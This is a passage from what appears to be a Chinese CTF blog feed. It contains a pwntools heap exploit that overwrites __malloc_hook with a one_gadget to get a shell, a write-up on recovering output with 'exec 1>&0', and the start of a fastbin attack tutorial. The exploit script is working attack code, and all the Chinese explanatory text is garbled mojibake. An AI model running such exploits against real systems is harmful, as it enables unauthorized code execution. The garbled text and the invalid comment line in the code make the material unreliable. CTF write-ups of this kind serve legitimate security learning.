sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>        p = remote(hostname, port)<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;debug&#x27;</span>:<br>        p = process(filename)<br>        debug_flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [remote|debug]&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    <span class="hljs-keyword">if</span> debug_flag:<br>        <span class="hljs-keyword">try</span>:<br>            gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            b * $rebase(0x0000000000000D6C)</span><br><span class="hljs-string">            b * $rebase(0x0000000000000F6D)</span><br><span class="hljs-string">            b * $rebase(0x000000000000108C)</span><br><span class="hljs-string">            b * $rebase(0x00000000000011D0)</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br>            gdb.attach(p, gdbscript = gdbscript)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to attach GDB: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br><br>elf = ELF(filename)<br>debug()<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Note system                                                                                                        </span><br><span class="hljs-string">1. create a note</span><br><span class="hljs-string">2. write note</span><br><span class="hljs-string">3. drop the note</span><br><span class="hljs-string">4. show the note</span><br><span class="hljs-string">5. exit</span><br><span class="hljs-string">choice: </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span> , <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , size , content</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">&#x27;content: &#x27;</span> , content)<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span> , <span class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span> , <span class="hljs-string">b&#x27;4&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#5</span><br><span class="hljs-comment"># add(0x10)</span><br><span class="hljs-comment">#----------------------æ³„éœ²libcåœ°å€-----------------------------#</span><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p8(<span class="hljs-number">0x41</span>)<br>edit(<span class="hljs-number">0</span> , <span class="hljs-built_in">len</span>(payload) + <span class="hljs-number">0x09</span> , payload)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0x71</span>)<br>edit(<span class="hljs-number">2</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>free(<span class="hljs-number">1</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x38</span>) <span class="hljs-comment">#1</span><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0x91</span>)<br>edit(<span class="hljs-number">1</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>free(<span class="hljs-number">2</span>) <span class="hljs-comment">#2</span><br>show(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>main_arena_88 = u64(p.recv(<span class="hljs-number">0x28</span>)[-<span class="hljs-number">8</span>:])<br>success(<span class="hljs-built_in">hex</span>(main_arena_88))<br>malloc_hook = main_arena_88 - <span class="hljs-number">88</span> - <span class="hljs-number">0x10</span><br>libc = LibcSearcher(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span> , malloc_hook)<br>base_addr = malloc_hook - libc.dump(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>)<br><br><span class="hljs-comment">#----------------------fastbin-----------------------------#</span><br>fake_chunk = malloc_hook - <span class="hljs-number">0x23</span><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p8(<span class="hljs-number">0x41</span>)<br>edit(<span class="hljs-number">3</span> , <span class="hljs-built_in">len</span>(payload) + <span class="hljs-number">0x09</span> , payload)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0x51</span>)<br>edit(<span class="hljs-number">5</span> , <span class="hljs-built_in">len</span>(payload) ,payload)<br>free(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">0x38</span>) <span class="hljs-comment">#2</span><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0x71</span>)<br>edit(<span class="hljs-number">2</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>free(<span class="hljs-number">5</span>) <br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0x71</span>) + p64(fake_chunk)<br>edit(<span class="hljs-number">2</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#5</span><br>success(<span class="hljs-string">&quot;malloc_hook : &quot;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>success(<span class="hljs-string">&quot;fake_chunk : &quot;</span> + <span class="hljs-built_in">hex</span>(fake_chunk))<br><br>realloc_hook = base_addr + libc.dump(<span class="hljs-string">&#x27;realloc&#x27;</span>)<br>success(<span class="hljs-built_in">hex</span>(realloc_hook))<br>one=[<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf1147</span>,<span class="hljs-number">0xf02a4</span>]//ç¬¬äºŒä¸ªåç§»<span class="hljs-number">0</span>ï¼Œç¬¬ä¸‰ä¸ªåç§»<span class="hljs-number">4</span>ï¼Œç¬¬å››ä¸ªåç§»<span class="hljs-number">13</span><br>one_gadget = base_addr + one[<span class="hljs-number">3</span>]<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">11</span> + p64(one_gadget) + p64(realloc_hook + <span class="hljs-number">13</span>)<br>edit(<span class="hljs-number">5</span> , <span class="hljs-built_in">len</span>(payload) , payload)<br>add(<span class="hljs-number">0x60</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>å †</category>
      
    </categories>
    
    
    <tags>
      
      <tag>onegadget</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wustctf2020_closed</title>
    <link href="/2024/08/03/wustctf2020-closed/"/>
    <url>/2024/08/03/wustctf2020-closed/</url>
    
    <content type="html"><![CDATA[<h2 id="IDAåç¼–è¯‘ä¼ªä»£ç "><a href="#IDAåç¼–è¯‘ä¼ªä»£ç " class="headerlink" title="IDAåç¼–è¯‘ä¼ªä»£ç "></a>IDAåç¼–è¯‘ä¼ªä»£ç </h2><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408031805202.png" alt="idaåç¼–è¯‘"></p><h2 id="æ–‡ä»¶ç›¸å…³çŸ¥è¯†"><a href="#æ–‡ä»¶ç›¸å…³çŸ¥è¯†" class="headerlink" title="æ–‡ä»¶ç›¸å…³çŸ¥è¯†"></a>æ–‡ä»¶ç›¸å…³çŸ¥è¯†</h2><p>è¿™é¢˜å°±æ˜¯ä¸€ä¸ªLinuxå‘½ä»¤ exec 1&gt;&amp;0</p><p>ç°åœ¨æ¥è§£é‡Šä¸€ä¸‹</p><ul><li>close(1);close(2);</li><li>æˆ‘ä»¬çš„ç›®çš„æ˜¯è¦å¾—åˆ°shellï¼Œå®˜æ–¹wpç»™çš„æ˜¯æ­¤å¤„å¯ä»¥è¾“å…¥ä¸²ï¼š$0ç„¶åå¯ä»¥æ‰§è¡Œæ–°çš„å‘½ä»¤exec 1&gt;&amp;0ä»¥åŠå…¶ä»–ä»¥æŸ¥çœ‹åˆ°flag</li><li>é‚£ä¹ˆè¿™æ¡è¯­å¥æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿå…¶ä¸­çš„0å’Œ1æ˜¯æŒ‡ä»€ä¹ˆå‘¢ï¼Ÿ<ul><li>0å’Œ1æ˜¯linuxä¸‹çš„æ–‡ä»¶æè¿°ç¬¦ã€‚</li><li>åœ¨Linuxä¸­ä¸€åˆ‡çš†æ–‡ä»¶ï¼Œæ–‡ä»¶æè¿°ç¬¦ï¼ˆfile descriptorï¼‰æ˜¯å†…æ ¸ä¸ºäº†é«˜æ•ˆç®¡ç†å·²è¢«æ‰“å¼€çš„æ–‡ä»¶æ‰€åˆ›å»ºçš„ç´¢å¼•ï¼Œæ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ï¼ˆé€šå¸¸æ˜¯å°æ•´æ•°ï¼‰ï¼Œç”¨äºæŒ‡ä»£è¢«æ‰“å¼€çš„æ–‡ä»¶ï¼Œæ‰€æœ‰æ‰§è¡ŒI&#x2F;Oæ“ä½œçš„ç³»ç»Ÿè°ƒç”¨éƒ½é€šè¿‡æ–‡ä»¶æè¿°ç¬¦ã€‚ç¨‹åºåˆšåˆšå¯åŠ¨çš„æ—¶å€™ï¼Œ0æ˜¯æ ‡å‡†è¾“å…¥ï¼Œ1æ˜¯æ ‡å‡†è¾“å‡ºï¼Œ2æ˜¯æ ‡å‡†é”™è¯¯ã€‚å¦‚æœæ­¤æ—¶å»æ‰“å¼€ä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œå®ƒçš„æ–‡ä»¶æè¿°ç¬¦ä¼šæ˜¯3ã€‚</li><li>æ ‡å‡†è¾“å…¥è¾“å‡ºçš„æŒ‡å‘æ˜¯é»˜è®¤çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹å®ƒä»¬çš„æŒ‡å‘ï¼Œä¹Ÿå³é‡å®šä½</li><li>ä¸¾ä¾‹å­ï¼Œå¯ä»¥ç”¨exec 1&gt;myoutputæŠŠæ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°myoutputæ–‡ä»¶ä¸­ï¼Œä¹Ÿå¯ä»¥ç”¨exec 0&lt;myinputæŠŠæ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°myinputæ–‡ä»¶ä¸­ï¼Œè€Œä¸”ï¼Œæ–‡ä»¶åå­—å¯ä»¥ç”¨&amp;+æ–‡ä»¶æè¿°ç¬¦æ¥ä»£æ›¿ã€‚</li><li>é‚£ä¹ˆé—®é¢˜åˆ°è¿™é‡Œå°±è§£å†³äº†ï¼Œä¸‰æ¡è¯­å¥ä¸­close(1);close(2)å³æŠŠæ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºå…³é—­ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥æ‰§è¡Œ exec 1&gt;&amp;0ï¼Œä¹Ÿå°±æ˜¯æŠŠæ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å…¥ï¼Œå› ä¸ºé»˜è®¤æ‰“å¼€ä¸€ä¸ªç»ˆç«¯åï¼Œ0ï¼Œ1ï¼Œ2éƒ½æŒ‡å‘åŒä¸€ä¸ªä½ç½®ä¹Ÿå°±æ˜¯å½“å‰ç»ˆç«¯ï¼Œæ‰€ä»¥è¿™æ¡è¯­å¥ç›¸å½“äºé‡å¯äº†æ ‡å‡†è¾“å‡ºï¼Œæ­¤æ—¶å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤å¹¶ä¸”çœ‹å¾—åˆ°è¾“å‡ºäº†</li></ul></li></ul><h3 id="å°±æ˜¯é‚£ä¹ˆç¥å¥‡ğŸ˜‚"><a href="#å°±æ˜¯é‚£ä¹ˆç¥å¥‡ğŸ˜‚" class="headerlink" title="å°±æ˜¯é‚£ä¹ˆç¥å¥‡ğŸ˜‚"></a>å°±æ˜¯é‚£ä¹ˆç¥å¥‡ğŸ˜‚</h3>]]></content>
    
    
    <categories>
      
      <category>BUUCTFåˆ·é¢˜</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linuxå‘½ä»¤</tag>
      
      <tag>æ–‡ä»¶æ“ä½œ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastbin Attack</title>
    <link href="/2024/08/03/Fastbin-Attack/"/>
    <url>/2024/08/03/Fastbin-Attack/</url>
    
    <content type="html"><![CDATA[<h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>fastbin attack æ˜¯ä¸€ç±»æ¼æ´çš„åˆ©ç”¨æ–¹æ³•ï¼Œæ˜¯æŒ‡æ‰€æœ‰åŸºäº fastbin æœºåˆ¶çš„æ¼æ´åˆ©ç”¨æ–¹æ³•ã€‚è¿™ç±»åˆ©ç”¨çš„å‰ææ˜¯ï¼š</p><ul><li>å­˜åœ¨å †æº¢å‡ºã€UAFç­‰èƒ½æ§åˆ¶chunkå†…å®¹çš„æ¼æ´</li><li>æ¼æ´å‘ç”Ÿäºfastbinç±»å‹çš„chunkä¸­</li></ul><p>fastbin attackå¤§è‡´å¯ä»¥åˆ†ä¸ºä¸€ä¸‹å‡ ç±»ï¼š</p><ul><li>Fastbin Double Free</li><li>House of Spirit</li><li>Alloc to Stack</li><li>Arbitrary Alloc</li></ul><p>å…¶ä¸­å‰ä¸¤ä¸ªæ¼æ´ä¾§é‡åˆ©ç”¨freeå‡½æ•°é‡Šæ”¾<strong>çœŸçš„chunkæˆ–ä¼ªé€ çš„chunk</strong>ã€‚ç„¶åå†æ¬¡ç”³è¯·chunkè¿›è¡Œæ”»å‡»ï¼Œåä¸¤ç§ä¾§é‡äºæ•…æ„ä¿®æ”¹fdæŒ‡é’ˆï¼Œç›´æ¥åˆ©ç”¨mallocç”³è¯·æŒ‡å®šä½ç½®chunkè¿›è¡Œæ”»å‡»ã€‚</p><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>fastbin attack å­˜åœ¨çš„åŸå› åœ¨äº fastbin æ˜¯ä½¿ç”¨å•é“¾è¡¨æ¥ç»´æŠ¤é‡Šæ”¾çš„å †å—çš„ï¼Œå¹¶ä¸”ç”± fastbin ç®¡ç†çš„ chunk å³ä½¿è¢«é‡Šæ”¾ï¼Œå…¶ next_chunk çš„ prev_inuse ä½ä¹Ÿä¸ä¼šè¢«æ¸…ç©ºã€‚ æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ fastbin æ˜¯æ€æ ·ç®¡ç†ç©ºé—² chunk çš„ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> *chunk1,*chunk2,*chunk3;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<br>    chunk3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<br>    <span class="hljs-comment">//è¿›è¡Œé‡Šæ”¾</span><br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-built_in">free</span>(chunk2);<br>    <span class="hljs-built_in">free</span>(chunk3);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>é‡Šæ”¾å‰</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000041</span> &lt;=== chunk1<br><span class="hljs-number">0x602010</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602040</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000041</span> &lt;=== chunk2<br><span class="hljs-number">0x602050</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602060</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602070</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602080</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000041</span> &lt;=== chunk3<br><span class="hljs-number">0x602090</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6020a0</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6020b0</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6020c0</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000020f41</span> &lt;=== top chunk<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œä¸‰æ¬¡ free è¿›è¡Œé‡Šæ”¾å</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000041</span> &lt;=== chunk1<br><span class="hljs-number">0x602010</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602040</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000041</span> &lt;=== chunk2<br><span class="hljs-number">0x602050</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000602000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602060</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602070</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602080</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000041</span> &lt;=== chunk3<br><span class="hljs-number">0x602090</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000602040</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6020a0</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6020b0</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6020c0</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000020f41</span> &lt;=== top chunk<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶ä½äº main_arena ä¸­çš„ fastbin é“¾è¡¨ä¸­å·²ç»å‚¨å­˜äº†æŒ‡å‘ chunk3 çš„æŒ‡é’ˆï¼Œå¹¶ä¸” chunk 3ã€2ã€1 æ„æˆäº†ä¸€ä¸ªå•é“¾è¡¨</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Fastbins[<span class="hljs-attribute">idx</span>=2, <span class="hljs-attribute">size</span>=0x30,ptr=0x602080]<br>===&gt;Chunk(<span class="hljs-attribute">fd</span>=0x602040, <span class="hljs-attribute">size</span>=0x40, <span class="hljs-attribute">flags</span>=PREV_INUSE)<br>===&gt;Chunk(<span class="hljs-attribute">fd</span>=0x602000, <span class="hljs-attribute">size</span>=0x40, <span class="hljs-attribute">flags</span>=PREV_INUSE)<br>===&gt;Chunk(<span class="hljs-attribute">fd</span>=0x000000, <span class="hljs-attribute">size</span>=0x40, <span class="hljs-attribute">flags</span>=PREV_INUSE)<br></code></pre></td></tr></table></figure><h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><p>astbin Double Free æ˜¯æŒ‡ fastbin çš„ chunk å¯ä»¥è¢«å¤šæ¬¡é‡Šæ”¾ï¼Œå› æ­¤å¯ä»¥åœ¨ fastbin é“¾è¡¨ä¸­å­˜åœ¨å¤šæ¬¡ã€‚è¿™æ ·å¯¼è‡´çš„åæœæ˜¯å¤šæ¬¡åˆ†é…å¯ä»¥ä» fastbin é“¾è¡¨ä¸­å–å‡ºåŒä¸€ä¸ªå †å—ï¼Œç›¸å½“äºå¤šä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªå †å—ï¼Œç»“åˆå †å—çš„æ•°æ®å†…å®¹å¯ä»¥å®ç°ç±»ä¼¼äºç±»å‹æ··æ·† (type confused) çš„æ•ˆæœã€‚</p><p>Fastbin Double Free èƒ½å¤ŸæˆåŠŸåˆ©ç”¨ä¸»è¦æœ‰ä¸¤éƒ¨åˆ†çš„åŸå› </p><ol><li>fastbin çš„å †å—è¢«é‡Šæ”¾å next_chunk çš„ pre_inuse ä½ä¸ä¼šè¢«æ¸…ç©º</li><li>fastbin åœ¨æ‰§è¡Œ free çš„æ—¶å€™ä»…éªŒè¯äº† main_arena ç›´æ¥æŒ‡å‘çš„å—ï¼Œå³é“¾è¡¨æŒ‡é’ˆå¤´éƒ¨çš„å—ã€‚å¯¹äºé“¾è¡¨åé¢çš„å—ï¼Œå¹¶æ²¡æœ‰è¿›è¡ŒéªŒè¯ã€‚</li><li>å­˜åœ¨UAFæ¼æ´</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Another simple check: make sure the top of the bin is not the</span><br><span class="hljs-comment">       record we are going to add (i.e., double free).  */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>      &#123;<br>        errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ¼”ç¤º"><a href="#æ¼”ç¤º" class="headerlink" title="æ¼”ç¤º"></a>æ¼”ç¤º</h3><p>ä¸‹é¢çš„ç¤ºä¾‹ç¨‹åºè¯´æ˜äº†è¿™ä¸€ç‚¹ï¼Œå½“æˆ‘ä»¬è¯•å›¾æ‰§è¡Œä»¥ä¸‹ä»£ç æ—¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *chunk1,*chunk2,*chunk3;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœä½ æ‰§è¡Œè¿™ä¸ªç¨‹åºï¼Œä¸å‡ºæ„å¤–çš„è¯ä¼šå¾—åˆ°å¦‚ä¸‹çš„ç»“æœï¼Œè¿™æ­£æ˜¯ _int_free å‡½æ•°æ£€æµ‹åˆ°äº† fastbin çš„ double freeã€‚</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs 1c">*** Error in `./tst&#x27;: double free or corruption (fasttop): 0x<span class="hljs-number">00000000022000</span>10 ***<br>======= 